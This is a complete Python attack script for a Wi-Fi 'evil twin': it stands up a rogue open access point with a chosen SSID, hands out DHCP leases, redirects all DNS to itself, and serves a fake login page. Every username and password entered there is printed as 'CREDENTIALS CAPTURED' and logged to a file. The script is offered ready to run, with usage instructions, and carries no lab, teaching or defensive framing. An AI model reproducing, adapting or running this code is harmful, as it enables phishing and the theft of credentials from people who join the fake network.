#!/usr/bin/env python3
"""
Standalone Evil Twin Attack Script
NO /tmp/ FILES - Everything in /etc/
"""

import subprocess
import time
import os
import sys
from pathlib import Path
from http.server import SimpleHTTPRequestHandler, HTTPServer
import json
import threading


class EvilTwinAttack:
    """Simple Evil Twin implementation with working DHCP"""

    def __init__(self, interface, ssid, portal_dir):
        self.interface = interface
        self.ssid = ssid
        self.portal_dir = Path(portal_dir)
        self.gateway_ip = "10.0.0.1"
        self.dhcp_range_start = "10.0.0.10"
        self.dhcp_range_end = "10.0.0.100"

        # Config file paths - ALL in /etc/
        self.hostapd_conf = "/etc/hostapd/evil_twin.conf"
        self.dnsmasq_conf = "/etc/dnsmasq.d/evil_twin.conf"
        self.dnsmasq_log = "/var/log/dnsmasq_evil.log"
        self.dnsmasq_leases = "/var/lib/misc/dnsmasq.leases"


    def check_root(self):
        """Verify script is running as root"""
        if os.geteuid() != 0:
            print("[!] This script must be run as root")
            sys.exit(1)


    def kill_processes(self):
        """Kill any existing hostapd/dnsmasq processes"""
        print("[*] Killing existing processes...")
        subprocess.run(["pkill", "hostapd"], check=False, stderr=subprocess.DEVNULL)
        subprocess.run(["pkill", "dnsmasq"], check=False, stderr=subprocess.DEVNULL)
        time.sleep(1)


    def configure_interface(self):
        """Configure network interface with static IP"""
        print(f"[*] Configuring {self.interface}...")

        # Stop NetworkManager interference
        subprocess.run(["systemctl", "stop", "NetworkManager"], check=False)

        # Bring interface down
        subprocess.run(["ip", "link", "set", self.interface, "down"], check=True)

        # Flush existing IP
        subprocess.run(["ip", "addr", "flush", "dev", self.interface], check=True)

        # Set new IP
        subprocess.run(["ip", "addr", "add", f"{self.gateway_ip}/24", "dev", self.interface], check=True)

        # Bring interface up
        subprocess.run(["ip", "link", "set", self.interface, "up"], check=True)

        # Wait for interface to be ready
        time.sleep(2)

        # Verify IP is set
        result = subprocess.run(["ip", "addr", "show", self.interface],
                              capture_output=True, text=True)
        if self.gateway_ip not in result.stdout:
            print(f"[!] Failed to set IP on {self.interface}")
            return False

        print(f"[+] Interface configured with IP {self.gateway_ip}")
        return True


    def enable_forwarding(self):
        """Enable IP forwarding"""
        print("[*] Enabling IP forwarding...")
        subprocess.run(["sysctl", "-w", "net.ipv4.ip_forward=1"],
                      check=True, stdout=subprocess.DEVNULL)
        print("[+] IP forwarding enabled")


    def create_hostapd_config(self):
        """Create hostapd configuration file"""
        print("[*] Creating hostapd config...")

        # Ensure /etc/hostapd/ exists
        subprocess.run(["mkdir", "-p", "/etc/hostapd"], check=True)

        config = f"""interface={self.interface}
driver=nl80211
ssid={self.ssid}
hw_mode=g
channel=6
macaddr_acl=0
auth_algs=1
ignore_broadcast_ssid=0
"""

        # Write directly to /etc/hostapd/
        with open(self.hostapd_conf, 'w') as f:
            f.write(config)

        subprocess.run(["chmod", "644", self.hostapd_conf], check=True)
        print(f"[+] hostapd config created: {self.hostapd_conf}")


    def create_dnsmasq_config(self):
        """Create dnsmasq configuration - DHCP only, no DNS"""
        print("[*] Creating dnsmasq config...")

        # Ensure /etc/dnsmasq.d/ exists
        subprocess.run(["mkdir", "-p", "/etc/dnsmasq.d"], check=True)
        subprocess.run(["mkdir", "-p", "/var/lib/misc"], check=True)
        subprocess.run(["mkdir", "-p", "/var/log"], check=True)

        # DNS + DHCP for captive portal redirect
        config = f"""# Interface to use
interface={self.interface}
bind-interfaces
listen-address={self.gateway_ip}

# DHCP Settings
dhcp-range={self.dhcp_range_start},{self.dhcp_range_end},12h
dhcp-option=3,{self.gateway_ip}
dhcp-option=6,{self.gateway_ip}
dhcp-authoritative

# DNS - redirect ALL domains to our server
address=/#/{self.gateway_ip}
no-resolv

# Logging
log-dhcp
log-queries
log-facility={self.dnsmasq_log}

# Lease file
dhcp-leasefile={self.dnsmasq_leases}
"""

        # Write directly to /etc/dnsmasq.d/
        with open(self.dnsmasq_conf, 'w') as f:
            f.write(config)

        subprocess.run(["chmod", "644", self.dnsmasq_conf], check=True)
        print(f"[+] dnsmasq config created: {self.dnsmasq_conf}")


    def start_hostapd(self):
        """Start hostapd in background"""
        print("[*] Starting hostapd...")

        # Start hostapd in background
        proc = subprocess.Popen(
            ["hostapd", self.hostapd_conf],
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE
        )

        # Give it time to start
        time.sleep(3)

        # Check if it's running
        if proc.poll() is not None:
            print("[!] hostapd failed to start")
            _, err = proc.communicate()
            print(f"Error: {err.decode()}")
            return False

        print("[+] hostapd started successfully")
        return True


    def start_dnsmasq(self):
        """Start dnsmasq for DHCP"""
        print("[*] Starting dnsmasq...")

        # Start dnsmasq (no -d flag, let it daemonize)
        result = subprocess.run(
            ["dnsmasq", "-C", self.dnsmasq_conf],
            capture_output=True,
            text=True
        )

        if result.returncode != 0:
            print(f"[!] dnsmasq failed to start: {result.stderr}")
            return False

        # Verify it's running
        time.sleep(1)
        check = subprocess.run(["pgrep", "dnsmasq"], capture_output=True)

        if check.returncode != 0:
            print("[!] dnsmasq not running after start")
            return False

        pid = check.stdout.decode().strip()
        print(f"[+] dnsmasq started (PID: {pid})")

        # Verify port 67 is listening
        port_check = subprocess.run(
            ["netstat", "-ulnp"],
            capture_output=True,
            text=True
        )

        if ":67" in port_check.stdout:
            print("[+] dnsmasq listening on port 67 (DHCP)")
            return True
        else:
            print("[!] dnsmasq running but not listening on port 67")
            print(f"[!] Check {self.dnsmasq_log} for errors")
            return False


    def start_web_server(self):
        """Start captive portal web server"""
        print(f"[*] Starting web server on port 80...")

        os.chdir(str(self.portal_dir))

        class CaptivePortalHandler(SimpleHTTPRequestHandler):
            def do_POST(self):
                """Handle credential capture"""
                if self.path == "/capture":
                    content_length = int(self.headers['Content-Length'])
                    post_data = self.rfile.read(content_length)

                    try:
                        data = json.loads(post_data.decode('utf-8'))
                        print(f"\n[!] CREDENTIALS CAPTURED: {data}\n")

                        # Save to file
                        with open("/var/log/captured_creds.txt", "a") as f:
                            f.write(f"{data}\n")
                    except:
                        pass

                    self.send_response(200)
                    self.send_header("Content-type", "application/json")
                    self.end_headers()
                    self.wfile.write(b'{"status":"ok"}')
                else:
                    self.send_response(404)
                    self.end_headers()

        server = HTTPServer(("0.0.0.0", 80), CaptivePortalHandler)
        print("[+] Web server started on http://0.0.0.0:80")
        server.serve_forever()


    def cleanup(self):
        """Cleanup and restore network state"""
        print("\n[*] Cleaning up...")

        subprocess.run(["pkill", "hostapd"], check=False)
        subprocess.run(["pkill", "dnsmasq"], check=False)
        subprocess.run(["ip", "addr", "flush", "dev", self.interface], check=False)
        subprocess.run(["systemctl", "start", "NetworkManager"], check=False)

        print("[+] Cleanup complete")


    def run(self):
        """Main execution flow"""
        try:
            self.check_root()
            self.kill_processes()

            if not self.configure_interface():
                print("[!] Interface configuration failed")
                return

            self.enable_forwarding()
            self.create_hostapd_config()
            self.create_dnsmasq_config()

            if not self.start_hostapd():
                print("[!] hostapd failed, exiting")
                self.cleanup()
                return

            if not self.start_dnsmasq():
                print("[!] dnsmasq failed, exiting")
                self.cleanup()
                return

            print("\n" + "="*50)
            print("Evil Twin Attack Running")
            print("="*50)
            print(f"SSID: {self.ssid}")
            print(f"Gateway: {self.gateway_ip}")
            print(f"DHCP Range: {self.dhcp_range_start} - {self.dhcp_range_end}")
            print("="*50)
            print("Press Ctrl+C to stop\n")

            # Start web server (blocking)
            self.start_web_server()

        except KeyboardInterrupt:
            print("\n[!] Interrupted by user")
            self.cleanup()
        except Exception as e:
            print(f"\n[!] Error: {e}")
            self.cleanup()


if __name__ == "__main__":
    if len(sys.argv) < 3:
        print("Usage: sudo python3 evil_twin.py <interface> <ssid>")
        print("Example: sudo python3 evil_twin.py wlan1 'Free WiFi'")
        sys.exit(1)

    interface = sys.argv[1]
    ssid = sys.argv[2]

    # Auto-detect portal directory
    script_dir = Path(__file__).parent
    portal_dir = script_dir / "portals" / "portal_1"

    if not portal_dir.exists():
        print(f"[!] Portal directory not found: {portal_dir}")
        print("[!] Creating basic portal directory...")
        portal_dir.mkdir(parents=True, exist_ok=True)

        # Create basic index.html
        with open(portal_dir / "index.html", "w") as f:
            f.write("""<!DOCTYPE html>
<html>
<head>
    <title>WiFi Login</title>
</head>
<body>
    <h1>WiFi Login Required</h1>
    <form method="POST" action="/capture">
        <input type="text" name="username" placeholder="Username" required><br>
        <input type="password" name="password" placeholder="Password" required><br>
        <button type="submit">Connect</button>
    </form>
</body>
</html>""")
        print(f"[+] Created basic portal at {portal_dir}")

    attack = EvilTwinAttack(interface, ssid, portal_dir)
    attack.run()
